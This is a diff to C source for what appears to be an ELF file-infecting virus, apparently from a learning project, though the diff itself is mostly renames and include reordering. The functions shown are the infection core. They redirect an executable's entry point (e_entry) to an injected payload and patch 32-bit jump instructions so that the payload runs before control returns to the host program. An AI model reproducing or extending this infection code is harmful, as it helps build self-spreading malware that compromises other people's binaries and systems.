@@ -1,10 +1,10 @@
 #include "virus.h"
+#include "jumps.h"
 #include "disasm.h"
 #include "disasm_utils.h"
-#include "jumps.h"
 #include "compiler_utils.h"
 #include "errors.h"
-#include "log.h"
+#include "logs.h"
 
 static bool	change_header_entry(struct safe_ptr clone_ref,
 			const struct entry *entry,
@@ -12,9 +12,9 @@ static bool	change_header_entry(struct safe_ptr clone_ref,
 {
 	log_trying_change_header_entry();
 
-	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
+	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
 
-	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
+	if (!elf_hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
 
 	const size_t	payload_offset = entry->payload_offset;
 	const size_t	payload_addr   = entry->payload_addr;
@@ -23,18 +23,18 @@ static bool	change_header_entry(struct safe_ptr clone_ref,
 	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;
 
 	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
-	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);
+	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);
 
 	if (loader_entry == NULL || loader_jump == NULL)
 		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
 
 	const size_t	loader_jump_addr  = payload_addr + (loader_jump - loader_entry);
-	const int32_t	loader_jump_value = entry_addr - (loader_jump_addr + JUMP32_INST_SIZE);
+	const int32_t	loader_jump_value = entry_addr - (loader_jump_addr + JMP32_INST_SIZE);
 
 	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value))
 		return false;
 
-	hdr->e_entry = payload_addr;
+	elf_hdr->e_entry = payload_addr;
 	return true;
 }
 
@@ -63,7 +63,7 @@ static bool	change_client_jump(struct safe_ptr clone_ref,
 	// get loader entry and jump pointers
 	const size_t	loader_jump_offset = payload_offset + dist_clientjmp_loader;
 	const void	*loader_entry = safe(clone_ref, payload_offset, 0);
-	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);
+	const void	*loader_jump  = safe(clone_ref, loader_jump_offset, JMP32_INST_SIZE);
 
 	if (loader_jump == NULL || loader_entry == NULL)
 		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
@@ -80,8 +80,8 @@ static bool	change_client_jump(struct safe_ptr clone_ref,
 	const size_t	client_jump_addr     = entry_addr + (client_jump - client_entry);
 	const size_t	client_jump_dst_addr = entry_addr + (client_jump_dst - client_entry);
 
-	const int32_t	loader_jump_value = (int32_t)(client_jump_dst_addr - (loader_jump_addr + JUMP32_INST_SIZE));
-	const int32_t	client_jump_value = (int32_t)(payload_addr - (client_jump_addr + JUMP32_INST_SIZE));
+	const int32_t	loader_jump_value = (int32_t)(client_jump_dst_addr - (loader_jump_addr + JMP32_INST_SIZE));
+	const int32_t	client_jump_value = (int32_t)(payload_addr - (client_jump_addr + JMP32_INST_SIZE));
 
 	// write values
 	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value)
